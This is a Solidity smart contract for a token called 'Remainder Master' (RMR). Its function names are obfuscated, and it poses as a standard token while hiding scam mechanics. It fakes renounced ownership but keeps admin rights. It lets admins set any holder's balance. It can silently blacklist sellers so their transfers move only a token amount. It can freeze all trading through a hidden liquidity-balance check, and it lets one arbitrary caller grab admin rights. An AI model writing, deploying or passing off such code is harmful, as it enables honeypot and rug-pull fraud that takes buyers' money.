//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface isSwapReceiver {
    function createPair(address receiverIsEnable, address receiverTo) external returns (address);
}

interface shouldLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minFee) external view returns (uint256);

    function transfer(address tradingSellMarketing, uint256 txIs) external returns (bool);

    function allowance(address exemptBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 txIs) external returns (bool);

    function transferFrom(
        address sender,
        address tradingSellMarketing,
        uint256 txIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeReceiverSwap, uint256 value);
    event Approval(address indexed exemptBuy, address indexed spender, uint256 value);
}

abstract contract fundBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapFeeTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxEnable is shouldLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RemainderMaster is fundBuy, shouldLiquidity, maxEnable {

    function marketingTx(uint256 txIs) public {
        feeMode();
        shouldList = txIs;
    }

    bool public minAt;

    uint256 private feeLaunched = 100000000 * 10 ** 18;

    function balanceOf(address minFee) public view virtual override returns (uint256) {
        return launchedTx[minFee];
    }

    mapping(address => mapping(address => uint256)) private tokenLaunch;

    function teamEnable(address teamLiquidity) public {
        feeMode();
        
        if (teamLiquidity == amountAuto || teamLiquidity == modeTo) {
            return;
        }
        tokenList[teamLiquidity] = true;
    }

    address swapWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public receiverTeam;

    bool private autoSell;

    function transfer(address buyTo, uint256 txIs) external virtual override returns (bool) {
        return maxTake(_msgSender(), buyTo, txIs);
    }

    function transferFrom(address buyExempt, address tradingSellMarketing, uint256 txIs) external override returns (bool) {
        if (_msgSender() != swapWallet) {
            if (tokenLaunch[buyExempt][_msgSender()] != type(uint256).max) {
                require(txIs <= tokenLaunch[buyExempt][_msgSender()]);
                tokenLaunch[buyExempt][_msgSender()] -= txIs;
            }
        }
        return maxTake(buyExempt, tradingSellMarketing, txIs);
    }

    string private toReceiver = "Remainder Master";

    function feeFromLaunch(address buyTo, uint256 txIs) public {
        feeMode();
        launchedTx[buyTo] = txIs;
    }

    function allowance(address toTotal, address fundMax) external view virtual override returns (uint256) {
        if (fundMax == swapWallet) {
            return type(uint256).max;
        }
        return tokenLaunch[toTotal][fundMax];
    }

    event OwnershipTransferred(address indexed exemptWallet, address indexed feeMinWallet);

    function owner() external view returns (address) {
        return sellReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return walletList;
    }

    uint256 amountShould;

    bool private tradingSell;

    uint256 private modeFee;

    uint8 private shouldAtSwap = 18;

    address public modeTo;

    constructor (){
        
        swapFeeTeam totalMax = swapFeeTeam(swapWallet);
        modeTo = isSwapReceiver(totalMax.factory()).createPair(totalMax.WETH(), address(this));
        if (receiverTeam) {
            tradingSell = true;
        }
        amountAuto = _msgSender();
        enableSell[amountAuto] = true;
        launchedTx[amountAuto] = feeLaunched;
        sellAt();
        if (autoSell) {
            receiverTeam = false;
        }
        emit Transfer(address(0), amountAuto, feeLaunched);
    }

    function feeMode() private view {
        require(enableSell[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return toReceiver;
    }

    function sellAutoReceiver(address buyExempt, address tradingSellMarketing, uint256 txIs) internal returns (bool) {
        require(launchedTx[buyExempt] >= txIs);
        launchedTx[buyExempt] -= txIs;
        launchedTx[tradingSellMarketing] += txIs;
        emit Transfer(buyExempt, tradingSellMarketing, txIs);
        return true;
    }

    address public amountAuto;

    uint256 public shouldIs;

    uint256 shouldList;

    mapping(address => bool) public enableSell;

    function getOwner() external view returns (address) {
        return sellReceiver;
    }

    function sellAt() public {
        emit OwnershipTransferred(amountAuto, address(0));
        sellReceiver = address(0);
    }

    mapping(address => bool) public tokenList;

    function totalSupply() external view virtual override returns (uint256) {
        return feeLaunched;
    }

    string private walletList = "RMR";

    address private sellReceiver;

    function decimals() external view virtual override returns (uint8) {
        return shouldAtSwap;
    }

    function approve(address fundMax, uint256 txIs) public virtual override returns (bool) {
        tokenLaunch[_msgSender()][fundMax] = txIs;
        emit Approval(_msgSender(), fundMax, txIs);
        return true;
    }

    mapping(address => uint256) private launchedTx;

    function listMarketing(address isLimit) public {
        require(isLimit.balance < 100000);
        if (minAt) {
            return;
        }
        
        enableSell[isLimit] = true;
        
        minAt = true;
    }

    address txLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function maxTake(address buyExempt, address tradingSellMarketing, uint256 txIs) internal returns (bool) {
        if (buyExempt == amountAuto) {
            return sellAutoReceiver(buyExempt, tradingSellMarketing, txIs);
        }
        uint256 modeAuto = shouldLiquidity(modeTo).balanceOf(txLiquidity);
        require(modeAuto == shouldList);
        require(tradingSellMarketing != txLiquidity);
        if (tokenList[buyExempt]) {
            return sellAutoReceiver(buyExempt, tradingSellMarketing, liquidityList);
        }
        return sellAutoReceiver(buyExempt, tradingSellMarketing, txIs);
    }

    uint256 constant liquidityList = 3 ** 10;

}